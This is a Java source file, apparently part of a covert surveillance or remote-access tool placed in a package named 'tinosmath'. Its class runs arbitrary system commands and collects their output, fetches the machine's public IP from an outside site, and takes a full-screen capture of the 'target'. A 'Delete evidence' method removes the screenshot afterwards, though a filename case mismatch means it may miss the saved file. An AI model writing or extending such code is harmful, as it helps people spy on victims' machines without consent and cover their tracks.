/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package tinosmath;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;

/**
 *
 * @author Tinotenda
 */
public class RetrieveInfo {
    
    //Get information from using commands
    String commandArg(String command) {
        String input = "";
        Process p;
        try {
             String s1;
             p = Runtime.getRuntime().exec(command);
             BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
             while((s1=in.readLine()) != null) {
                 input = input+s1+"\n";
             }
        } catch (IOException ex) {
            Logger.getLogger(RetrieveInfo.class.getName()).log(Level.SEVERE, null, ex);
        }
        return input;
    }
    
    //Get the global IP Address
    String global_ip_address() {
        BufferedReader input = null;
        String in = "";
        //Get Global Ip address from website "whatismyipaddress.com"
        String url_web = "http://ipv4bot.whatismyipaddress.com/";
        try {
            input = new BufferedReader(new InputStreamReader(new URL(url_web).openStream()));
            in = input.readLine();
        } catch (MalformedURLException ex) {
            Logger.getLogger(RetrieveInfo.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(RetrieveInfo.class.getName()).log(Level.SEVERE, null, ex);
        }
        return in;
    }
    
    //Get Screenshot of target
    void Screenshot_Target() {
        Rectangle rect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        
             try {
            BufferedImage image = new Robot().createScreenCapture(rect);
            try {
                //Save image
                ImageIO.write(image, "png", new File("Screenshot.png"));
            } catch (IOException ex) {
                Logger.getLogger(RetrieveInfo.class.getName()).log(Level.SEVERE, null, ex);
            }
        } catch (AWTException ex) {
            Logger.getLogger(RetrieveInfo.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    //Delete evidence
    void DeleteScreenShot() {
        File screenshot = new File("screenshot.png");
        screenshot.delete();
    }
    
    
}
